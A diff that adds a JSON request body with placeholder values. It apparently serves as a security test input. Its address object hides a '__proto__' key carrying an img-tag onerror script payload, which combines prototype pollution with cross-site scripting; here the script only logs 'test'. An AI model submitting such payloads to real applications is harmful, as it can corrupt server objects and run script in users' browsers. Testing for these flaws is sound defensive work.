@@ -1,0 +1,19 @@
+{
+    "rperiod":"44",
+    "rtype":"t",
+    "name":"d",
+    "address":{
+        "streetAddress":"d",
+        "city":"d",
+        "province":"d",
+        "country":"d",
+        "__proto__": {
+            "planet":"<img src=x onerror=console.log('test')>"
+        }
+    },
+    "year":"2",
+    "make":"d",
+    "model":"d",
+    "color":"dd"
+
+}
